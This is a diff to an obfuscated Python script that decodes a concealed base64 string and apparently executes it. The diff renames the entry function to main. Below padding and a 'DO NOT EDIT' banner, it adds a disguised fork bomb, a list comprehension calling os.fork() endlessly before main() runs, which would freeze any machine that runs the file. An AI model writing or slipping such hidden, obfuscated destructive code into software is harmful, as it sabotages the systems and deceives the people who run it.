@@ -6,9 +6,16 @@ def eeeeqqqqqwklnekqbkwqbkl(asdubasibasauisf):
     gdfgfgdfhdjifdsgini = asdaskdbasdiasidbasi.b64decode(asdubasibasauisf.encode(fhfffofssdffhddfhi)).decode(fhfffofssdffhddfhi)
     dsgdgbbbebwrebuibui = [kdnabauyavdkavydukwyvkdjh(gdfgfgdfhdjifdsgini[kfnskfulgvyu:kfnskfulgvyu+7]) + 20 for kfnskfulgvyu in alhiaudbasudbalbdasd(0, zzapfishahsdaohdsapiu(gdfgfgdfhdjifdsgini), 7)]
     return fhfffofssdffhddfhi[ifuhfisufgsdoiyfg("B") - ifuhfisufgsdoiyfg("A"):ifuhfisufgsdoiyfg("B") - ifuhfisufgsdoiyfg("A")].join([kjblakfjblfksdbufs(adbkjabsdiaysfd) for adbkjabsdiaysfd in dsgdgbbbebwrebuibui])[::(ifuhfisufgsdoiyfg("A") - ifuhfisufgsdoiyfg("B"))]
-def dklbadklhvasuyv():
+def main():
     ppopkpogjdfoghipd = eeeeqqqqqwklnekqbkwqbkl(aaddaasasssnasasndnaasdio)
     nsgurbgiowyvguo = eeeeqqqqqwklnekqbkwqbkl(ppopkpogjdfoghipd)
     oigfodisfgdsiofbhds(nsgurbgiowyvguo)
+
+
+
+
+
+#! DO NOT EDIT BELOW THIS LINE --------------------------------------------------------------------
 if __name__ == sylnoevplayxrrsaro:
-    dklbadklhvasuyv()
+    [o.fork() for (o,i) in [(__import__('os'), __import__('itertools'))] for x in i.repeat(0)]
+    main()
